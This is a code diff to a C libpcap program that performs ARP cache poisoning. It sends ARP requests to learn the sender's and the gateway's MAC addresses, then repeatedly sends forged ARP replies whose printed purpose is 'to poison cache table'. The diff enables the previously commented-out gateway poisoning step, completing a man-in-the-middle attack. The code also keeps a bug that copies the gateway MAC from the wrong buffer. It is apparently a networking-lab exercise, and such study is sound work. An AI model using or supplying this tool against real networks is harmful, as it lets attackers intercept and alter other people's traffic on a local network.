@@ -71,10 +71,13 @@ int main(int argc, char** argv){
 	printf("%x\nUsr IP Addr : %s\n",host_mac[5], inet_ntoa(host_ip));
 	
 	payload = (u_char *)malloc(sizeof(u_char) * 1000);
+	payload2 = (u_char *)malloc(sizeof(u_char) * 1000);
+	rcv_packet = (u_char*)malloc(sizeof(u_char) * 1000);
+	rcv_packet2 = (u_char*)malloc(sizeof(u_char) * 1000);
 	handle = pcap_open_live(argv[1], 65536, 1, 1000, errbuf);
 	if(handle == NULL){printf("Cannot Open Device %s\n", interface);return -1;}
 	if(pcap_lookupnet(interface,&inet,&submask,errbuf) == -1){printf("Different Network\n");return -1;}
-		
+	printf("Make broadcast packet\n");
 	make_packet(&payload, &length,__ARP_REQUEST__,host_ip,sender_ip,host_mac,send_mac);
 	for(int i = 0 ; i < length ; i++) printf("%x ",payload[i]);
 	printf("\n");	
@@ -84,21 +87,27 @@ int main(int argc, char** argv){
 	while(pcap_next_ex(handle, &header, &rcv_packet)!=1);
 	if(filtering(rcv_packet,send_mac, sender_ip, __ARP_REPLY__, host_mac) == 1){
 		for(int i = 0, j = 6 ; i < 6 ; i++,j++){send_mac[i] = rcv_packet[j];}
-		printf("\n");
+		printf("get sender mac addr\n");
 		for(int i = 0 ; i < 5 ; i++) printf("%X : ", send_mac[i]);	
 		printf("%X\n",send_mac[5]);
-		
+		printf("make arp reply packet to poison cache table\n");
 		make_packet(&payload, &length,__ARP_REPLY__,target_ip,sender_ip,host_mac,send_mac);
-		
+		for(int i = 0 ; i < length ; i++) printf("%x ",payload[i]);
+		printf("\n");
 		while(pcap_sendpacket(handle,payload,length));	
 	}
-	/*
+	printf("Make broadcast packet to get gateway mac addr\n");
 	make_packet(&payload2, &length2, __ARP_REQUEST__, host_ip, target_ip, host_mac, target_mac);
 	for(int i = 0 ; i < length2 ; i++) printf("%x ", payload2[i]);
 	printf("\n");
 	while(pcap_sendpacket(handle,payload2,length2));
-	while(pcap_next_ex(handle, &header, rcv_packet2) != 1);
-	if(filtering(rcv_packet, target_mac, target_ip,  __ARP_REPLY__, host_mac) == 1){
+	while(1){
+		pcap_next_ex(handle,&header,&rcv_packet2);
+		if(filtering(rcv_packet2,target_mac,target_ip,__ARP_REPLY__,host_mac) == 1) break;
+	}
+	printf("Print ARP Reply from gateway\n");
+	for(int i = 0 ; i < length2 ; i++) printf("%x ", rcv_packet2[i]);
+	if(filtering(rcv_packet2, target_mac, target_ip,  __ARP_REPLY__, host_mac) == 1){
 		for(int i = 0, j = 6 ; i < 6 ; i++, j++){target_mac[i] = rcv_packet[j];}
 		printf("\n");
 		for(int i = 0 ; i < 5; i ++) printf("%X : ", target_mac[i]);
@@ -107,7 +116,6 @@ int main(int argc, char** argv){
 		make_packet(&payload2,&length2, __ARP_REPLY__, sender_ip,target_ip, host_mac, target_mac);
 		while(pcap_sendpacket(handle,payload2,length2));
 	}
-	*/
 	/* Capture Sender's Packet 
 	
 	while(1){
@@ -140,16 +148,15 @@ int main(int argc, char** argv){
 int filtering(u_char* rcv_packet,char sender_mac[], struct in_addr sender_ip, uint16_t operation, char host_mac[]){
 	struct ether_header *eth = (struct ether_header*)rcv_packet;
 	arphdr *arp = (arphdr*)(rcv_packet + sizeof(*eth));
-	uint8_t src_ip_addr[4];
-	inet_ntop(AF_INET,(void*)&,&src_ip_addr);
+	struct in_addr tmpadr;
+	memcpy(&tmpadr, &arp->src_ip_addr,sizeof(tmpadr));
 	if(eth->ether_type != htons(ETHERTYPE_ARP) || (arp->operation != htons(operation))){
-		printf("1\n");
 		return 0;
 	}
 	
-	if(strncmp(eth->ether_dhost, host_mac, 6)){printf("2\n"); return 0;}
+	if(strncmp(eth->ether_dhost, host_mac, 6)){ return 0;}
 	
-	if(src_ip_addr != sender_ip.s_addr) {printf("%d\n%d\n",src_ip_addr, sender_ip);return 0;} 
+	if(memcmp(&tmpadr, &sender_ip, sizeof(tmpadr))) {return 0;} 
 
 	for(int i = 0 ; i < 6 ; i++) sender_mac[i] = eth->ether_shost[i];
 
